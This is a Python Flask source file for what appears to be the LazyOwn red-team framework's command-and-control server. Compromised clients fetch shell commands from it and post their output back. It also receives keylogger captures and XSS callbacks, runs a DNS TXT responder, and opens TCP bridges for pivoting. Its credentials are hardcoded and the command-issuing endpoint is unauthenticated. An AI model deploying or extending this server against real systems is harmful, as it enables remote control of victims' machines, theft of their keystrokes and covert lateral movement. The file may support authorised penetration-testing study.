import re
import os
import sys
import json
import socket
import logging
import threading
from functools import wraps
from dnslib.dns import RR, QTYPE, TXT
from dnslib.server import DNSServer, DNSLogger
from flask import Flask, request, render_template, redirect, url_for, jsonify, Response

USERNAME = 'LazyOwn'
PASSWORD = 'LazyOwn'
BASE_DIR = os.path.abspath("../sessions")  

if len(sys.argv) > 1:
    lport = sys.argv[1]
    print(f"    [!] Launch C2 at: {lport}")
else:
    print("    [!] Need pass the port as argument")
    sys.exit(2)

app = Flask(__name__)
commands = {} 
results = {}  
connected_clients = set() 

def check_auth(username, password):
    """Verifica si el usuario y contraseña son correctos"""
    return username == USERNAME and password == PASSWORD

def authenticate():
    """Solitica autenticación"""
    return Response(
        'Invalid credentials. Please provide valid username and password.\n', 
        401, 
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

def start_dns_server():
    """
    Inicia un servidor DNS que responde con un registro TXT específico.
    """
    class CustomDNSResolver:
        def resolve(self, request, handler):
            reply = request.reply()
            qname = request.q.qname
            if str(qname) == "info.lazyown.com.":
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("http://lazyown.com/info")))
            else:
                reply.header.rcode = 3  
            return reply

    resolver = CustomDNSResolver()
    logger = DNSLogger(prefix=False)
    server = DNSServer(resolver, port=53, address="0.0.0.0", logger=logger)
    print("    [*] Server DNS started at port 53.")
    server.start()

@app.route('/')
@requires_auth
def index():
    return render_template('index.html', connected_clients=connected_clients, results=results)


@app.route('/browse', methods=['GET'])
def browse_files():
    subdir = request.args.get('dir', '')
    current_path = os.path.abspath(os.path.join(BASE_DIR, subdir))

    
    if not current_path.startswith(BASE_DIR):
        return "Access to this directory is not allowed", 403

    
    if not os.path.exists(current_path) or not os.path.isdir(current_path):
        return "Directory does not exist", 404


        
    entries = []
    for entry in os.listdir(current_path):
        entry_path = os.path.join(current_path, entry)
        entries.append({
            "name": entry,
            "is_directory": os.path.isdir(entry_path),
            "path": os.path.join(subdir, entry) if subdir else entry
        })

    
    return render_template('browse.html', current_path=current_path, entries=entries, parent=subdir.rsplit('/', 1)[0] if '/' in subdir else '')



@app.route('/xss', methods=['GET'])
def xss():
    params = request.args
    if params:
        path = os.getcwd
        log_dir = f"{path}/../sessions"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        log_file = os.path.join(log_dir, "xss.log")
        logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
        logging.info(f"XSS Exec with params: {params}")
        return "XSS report", 200

    return "No data received", 400

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    connected_clients.add(client_id) 
    if client_id in commands:
        command = commands.pop(client_id)
        print(f"[INFO] Sending command to {client_id}: {command}")

        return command, 200 
    return '', 204

@app.route('/command/<client_id>', methods=['POST'])
def receive_result(client_id):
    try:
        data = request.json
        if data and 'output' in data:
            output = data['output']
            results[client_id] = output
            print(f"[INFO] Received output from {client_id}: {output}")
            return jsonify({"status": "success"}), 200
        else:
            print(f"[ERROR] Invalid data received from {client_id}")
            return jsonify({"status": "error", "message": "Invalid data format"}), 400
    except json.JSONDecodeError:
        print(f"[ERROR] Invalid JSON received from {client_id}")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception as e:
        print(f"[ERROR] Unexpected error processing request from {client_id}: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route('/issue_command', methods=['POST'])
def issue_command():
    client_id = request.form['client_id']
    command = request.form['command']
    commands[client_id] = command
    return redirect(url_for('index'))

@app.route('/upload', methods=['GET', 'POST'])
@requires_auth
def upload():
    """
    Handle file uploads securely.

    This function allows users to upload files and ensures that the uploaded filename is sanitized
    to prevent directory traversal and other vulnerabilities. Files are saved in a specified uploads directory.

    Returns:
        JSON response indicating the status of the upload or an HTML form for file upload.
    """
    if request.method == 'POST':
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file part"}), 400
        
        file = request.files['file']

        if file.filename == '':
            return jsonify({"status": "error", "message": "No selected file"}), 400
        safe_filename = secure_filename(file.filename)
        path = os.getcwd().replace("modules", "sessions")
        uploads_dir = os.path.join(path, 'uploads')
        os.makedirs(uploads_dir, exist_ok=True)
        filepath = os.path.join(uploads_dir, safe_filename)
        file.save(filepath)  
        print(f"[INFO] File uploaded: {safe_filename}")
        
        return jsonify({"status": "success", "message": f"File uploaded: {safe_filename}"}), 200
    
    return '''
    <!doctype html>
    <title>Upload File</title>
    <h1>Upload a File</h1>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    '''
@app.route('/keylogger/<client_id>', methods=['POST'])
def keylogger(client_id):
    """
    Recibe los logs del keylogger desde el cliente.

    :param client_id: Identificador del cliente que envía los logs.
    :return: Respuesta de éxito o error.
    """
    try:
        log_data = request.form.get('log')
        if log_data:
            path = os.getcwd().replace("modules", "sessions")
            keylog_dir = os.path.join(path, 'keylogs')
            os.makedirs(keylog_dir, exist_ok=True)
            log_file = os.path.join(keylog_dir, f'keylog_{client_id}.txt')
            with open(log_file, 'a') as f:
                f.write(log_data + '\n')
            print(f"[INFO] Keylog recibido de {client_id}.")
            return jsonify({"status": "success", "message": "Logs received"}), 200
        else:
            print(f"[ERROR] No se recibieron logs desde {client_id}.")
            return jsonify({"status": "error", "message": "No logs received"}), 400

    except Exception as e:
        print(f"[ERROR] Error procesando logs de {client_id}: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route('/start_bridge', methods=['POST'])
@requires_auth
def start_bridge():
    """Start a TCP bridge to a specified remote host and port."""
    local_port = int(request.form['local_port'])
    remote_host = request.form['remote_host']
    remote_port = int(request.form['remote_port'])
    bridge_thread = threading.Thread(target=tcp_bridge, args=(local_port, remote_host, remote_port))
    bridge_thread.start()
    
    return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200

def tcp_bridge(local_port, remote_host, remote_port):
    """Establish a TCP bridge between a local port and a remote host."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', local_port))
    server_socket.listen(5)
    print(f"[*] Listening for connections on port {local_port}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[INFO] Accepted connection from {addr}")
        
        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()

def handle_client(client_socket, remote_host, remote_port):
    """Handle communication between the client and the remote server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.connect((remote_host, remote_port))
        
        while True:
            
            client_data = client_socket.recv(4096)
            if not client_data:
                break
            server_socket.sendall(client_data)

            
            server_data = server_socket.recv(4096)
            if not server_data:
                break
            client_socket.sendall(server_data)

    client_socket.close()        
def secure_filename(filename):
    """
    Sanitize the filename to prevent directory traversal and unauthorized access.

    :param filename: The original filename from the upload.
    :return: A sanitized filename that is safe for storage.
    """
    filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
    return filename[:255]

if __name__ == '__main__':
    path = os.getcwd().replace("modules", "sessions" )
    uploads = f"{path}/uploads"
    dns_thread = threading.Thread(target=start_dns_server, daemon=True)
    dns_thread.start()
    if not os.path.exists(uploads):
        os.makedirs(uploads)  
    app.run(host='0.0.0.0', port=lport)
